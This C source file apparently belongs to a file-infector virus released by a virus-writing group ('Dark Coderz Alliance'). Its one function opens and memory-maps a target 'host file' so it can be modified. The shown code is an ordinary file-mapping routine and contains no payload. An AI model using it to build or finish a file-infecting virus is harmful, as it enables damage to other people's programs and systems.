/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/* Description : open_target opens argv[1] , our host file , and maps it 
   so we can modify it without having to write to the orginal file.see mmap(2) for
   more info.
*/


#include "defines.h"

extern errno;

int open_target(Infect *file)
{
	/* open file... */
	if((file->fd_f=open(file->src_f,O_RDONLY))==-1) ERROR(open_target);
	
	/* seek to end of file -> file size */
	if((file->file_size=lseek(file->fd_f,0,SEEK_END))<0) ERROR(open_target);
 	 
        /* align up file size */
	file->aligned_fsz=ALIGN_UP(file->file_size);
	
	/* mmap target file */
	if(!map_file(file)) return false;
	
	return true;
}
